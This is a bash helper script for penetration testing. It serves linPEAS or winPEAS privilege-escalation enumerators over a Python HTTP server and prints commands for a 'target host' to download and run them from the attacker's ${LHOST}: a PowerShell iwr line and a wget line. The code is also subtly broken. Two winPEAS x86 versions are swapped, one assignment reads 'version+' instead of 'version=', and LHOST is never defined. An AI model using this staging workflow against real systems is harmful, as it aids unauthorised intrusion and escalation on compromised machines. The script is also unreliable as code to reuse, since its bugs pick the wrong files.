#!/bin/bash
PortSelection(){
	echo -e "\nSpecify port to serve the PEAS:\n"
	read Port
	       }
cdwinpeas(){
	cd /opt/winpeas/
	echo -e "Commands to run on target host:\n\npowershell; iwr -uri http://${LHOST}:${Port}/${version} -Outfile ${version}; cmd;\n.\\${version}\n"
	python3 -m http.server ${Port}
	exit 0
	}

cdlinpeas(){
	cd /opt/linpeas/
	echo -e "Try this on your target host:\n\nwget http://${LHOST}:${Port}/${version}"
	python3 -m http.server ${Port}
	exit 0
	}
echo -e "\nlinPEAS Or winPEAS? (Enter item number):\n"
		PeasOptions=("linPEAS" "winPEAS")
            	select Peas in "${PeasOptions[@]}"; do
           	 case $Peas in
			"winPEAS")
			            PortSelection
			            echo -e "Select winPEAS version:"
			            Versions=("winPEAS.bat" "winPEASany.exe" "winPEASany_ofs.exe" "winPEASx64.exe" "winPEASx64_ofs.exe" "winPEASx86.exe" "winPEASx86_ofs.exe")
			            select version in "${Versions[@]}"; do
                        case $version in 
			            	"winPEAS.bat")
			            			version=winPEAS.bat
			            			cdwinpeas
			            			;;
					"winPEASany.exe")
			            			version=winPEASany.exe
			            			cdwinpeas
			            			;;
			            	"winPEASany_ofs.exe")
			            			version=winPEASany_ofs.exe
			            			cdwinpeas
			            			;;
					"winPEASx64.exe")
							version=winPEASx64.exe
							cdwinpeas
							;;			            	
					"winPEASx64_ofs.exe")
			            			version=winPEASx64_ofs.exe
			            			cdwinpeas
			            			;;
			            	"winPEASx86.exe")
			            			version=winPEASx86_ofs.exe
			            			cdwinpeas
			            			;;
			            	"winPEASx86_ofs.exe")
			            			version=winPEASx86.exe
			            			cdwinpeas
			            			;;	                    
					esac
					done
				;;
			     "linPEAS")
			            PortSelection
			            echo -e "Select linPEAS version:"
			            Versions=("linpeas.sh" "linpeas_darwin_amd64" "linpeas_darwin_arm64" "linpeas_linux_386" "linpeas_linux_amd64" "linpeas_fat.sh" "linpeas_linux_arm")
			            select version in "${Versions[@]}"; do
                        case $version in
			            	"linpeas.sh")
			            			version=linpeas.sh
			            			cdlinpeas
			            			;;
			            	"linpeas_darwin_amd64")
			            			version=linpeas_darwin_amd64
			            			cdlinpeas
			            			;;
			            	"linpeas_darwin_arm64")
			            			version=linpeas_darwin_arm64
			            			cdlinpeas
			            			;;
			            	"linpeas_linux_386")
			            			version=linpeas_linux_386
			            			cdlinpeas
			            			;;
			            	"linpeas_linux_amd64")
			            			version=linpeas_linux_amd64
			            			cdlinpeas
			            			;;
			            	"linpeas_fat.sh")
			            			version=linpeas_fat.sh
			            			cdlinpeas
			            			;;
			            	"linpeas_linux_arm")
			            			version+linpeas_linux_arm
			            			cdlinpeas
			            			;; 

				esac
				done 
			;;
* )
	                    	    echo -e "\nInvalid Selection! Exiting..."
	                    	    exit -1
				                ;;
	          esac
		  done
